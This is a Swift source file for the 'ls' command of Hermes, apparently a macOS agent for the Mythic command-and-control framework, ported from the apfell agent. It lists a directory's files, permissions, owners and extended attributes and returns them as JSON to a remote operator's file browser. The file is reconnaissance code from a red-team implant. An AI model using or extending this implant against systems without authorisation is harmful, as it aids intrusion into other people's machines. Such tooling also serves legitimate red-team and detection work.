//
//  ls.swift
//  Hermes
//
//  Created by Justin Bui on 6/6/21.
// Ported from apfell's ls command https://github.com/MythicAgents/apfell/blob/master/Payload_Type/apfell/agent_code/ls.js

import Foundation

func ls(job: Job) {
    var jsonResult:JSON = [:]
    var path = ""
    let fileManager = FileManager.default
    
    do {
        // Convert json to path
        let jsonParameters = try JSON(data: toData(string: job.parameters))
        path = jsonParameters["path"].stringValue
        
        // Check if "." or "" to set path to current working directory
        if (path == "." || path == "") {
            path = fileManager.currentDirectoryPath
        }
        
        // Strip out quotes if they exist, concept from Apfell agent
        if (path.prefix(1) == "\"") {
            path.removeFirst()
            path.removeLast()
        }
        
        // Check if ~ to base search from user home directory
        if (path.prefix(1) == "~") {
            path = NSString(string: path).expandingTildeInPath
        }
                
        jsonResult["host"].stringValue = Host.current().localizedName!
        jsonResult["update_deleted"].boolValue = true
        
        var isDir : ObjCBool = false
        if fileManager.fileExists(atPath: path, isDirectory:&isDir) {
            if !isDir.boolValue {
                // isFile
                jsonResult["is_file"].boolValue = true
                jsonResult["files"].arrayObject = []
                jsonResult["success"].boolValue = true
            }
            else {
                // isDirectory
                jsonResult["is_file"].boolValue = false
                
                // Ensure trailing slash on path
                if (path.suffix(1) != "/") {
                    path = path + "/"
                }
                
                let files = try fileManager.contentsOfDirectory(atPath: path)
                jsonResult["success"].boolValue = true
                var jsonFiles = [JSON]()
                
                // Loop through files in folder
                for file in files {
                    let fullPath = path + file
                    let attributes = try fileManager.attributesOfItem(atPath: fullPath)
                    
                    // Get file name
                    let name = file
                    
                    // Determine folder vs file
                    var isFile = true
                    if (fileManager.fileExists(atPath: fullPath, isDirectory:&isDir)) {
                        if isDir.boolValue {
                            isFile = false
                        }
                    }
                    
                    // Determine access_time, modify_time, and size
                    // Return blank access time, we will return modify_time within permissions JSON
                    let accessTime = ""
                    let modifyTime = (attributes[FileAttributeKey.modificationDate] as! Date).toString(dateFormat: "MM-dd-yyyy")
                    let size = attributes[FileAttributeKey.size] as! UInt64
                    
                    // Get all fields for permissions JSON
                    let posixPermissions = String(attributes[FileAttributeKey.posixPermissions] as! Int, radix: 8, uppercase: false)
                    let owner = attributes[FileAttributeKey.ownerAccountName] as? String
                    let group = attributes[FileAttributeKey.groupOwnerAccountName] as? String
                    let hidden = attributes[FileAttributeKey.extensionHidden] as? Bool
                    let createTime = (attributes[FileAttributeKey.creationDate] as! Date).toString(dateFormat: "MM-dd-yyyy")
                    
                    // Get extended attributes
                    let fileURL = URL(fileURLWithPath: fullPath)
                    let extendedList = try fileURL.listExtendedAttributes()
                    let extendedAttributes = extendedList.joined(separator: "|")
                    
                    // Create JSON struct for permissions of each file/folder
                    let jsonPermissions = JSON([
                        "posix": posixPermissions,
                        "owner": owner,
                        "group": group,
                        "hidden": hidden,
                        "create_time": createTime,
                        "extended.attributes": extendedAttributes,
                    ])
                    
                    // Create JSON struct for each file/folder, this will be appended to jsonFiles
                    let jsonFile = JSON([
                        "is_file": isFile,
                        "permissions": jsonPermissions,
                        "name": name,
                        "access_time": accessTime,
                        "modify_time": modifyTime,
                        "size": size,
                    ])
                    jsonFiles.append(jsonFile)
                }
                jsonResult["files"].arrayObject = jsonFiles
            }
        }
        else {
            jsonResult["success"].boolValue = false
        }
        
        // Filling out higher level file_browser info
        let attributes = try fileManager.attributesOfItem(atPath: path)
        let posixPermissions = String(attributes[FileAttributeKey.posixPermissions] as! Int, radix: 8, uppercase: false)
        
        
        // If at / set parent_path to blank, else pop one from components and re-concatenate for parent_path
        var components = fileManager.componentsToDisplay(forPath: path)
        if (components?[0] == "Macintosh HD") {
            jsonResult["parent_path"].stringValue = ""
        }
        else {
            _ = components?.popLast()
            jsonResult["parent_path"].stringValue = "/" + (components?.joined(separator: "/"))! as String
        }
   
        // Determine file/folder name from path
        let displayName = fileManager.displayName(atPath: path)
        if  displayName == "Macintosh HD" {
            jsonResult["name"].stringValue = "/"
        }
        else {
            jsonResult["name"].stringValue = displayName
        }
        
        jsonResult["access_time"].stringValue = ""
        jsonResult["size"].uInt64Value = attributes[FileAttributeKey.size] as! UInt64
        jsonResult["modify_time"].stringValue = (attributes[FileAttributeKey.modificationDate] as! Date).toString(dateFormat: "MM-dd-yyyy")
    
        // Get all fields for permissions JSON
        let owner = attributes[FileAttributeKey.ownerAccountName] as? String
        let group = attributes[FileAttributeKey.groupOwnerAccountName] as? String
        let hidden = attributes[FileAttributeKey.extensionHidden] as? Bool
        let createTime = (attributes[FileAttributeKey.creationDate] as! Date).toString(dateFormat: "MM-dd-yyyy")
        
        // Get extended attributes
        let fileURL = URL(fileURLWithPath: path)
        let extendedList = try fileURL.listExtendedAttributes()
        let extendedAttributes = extendedList.joined(separator: "|")
        
        let jsonPermissions = JSON([
            "posix": posixPermissions,
            "owner": owner,
            "group": group,
            "hidden": hidden,
            "create_time": createTime,
            "extended.attributes": extendedAttributes,
        ])
        jsonResult["permissions"] = jsonPermissions
        
        // Return data depending on file_browser parameter
        job.fileBrowser = jsonResult
        job.completed = true
        job.success = true
        
        if(jsonParameters["file_browser"].boolValue) {
            
            job.result = "added data to file browser"
        }
        else {
            job.result = jsonResult.description
        }
        
    }
    catch {
        job.result = "Exception caught: \(error)"
        job.completed = true
        job.success = false
        job.status = "error"
        return
    }
}
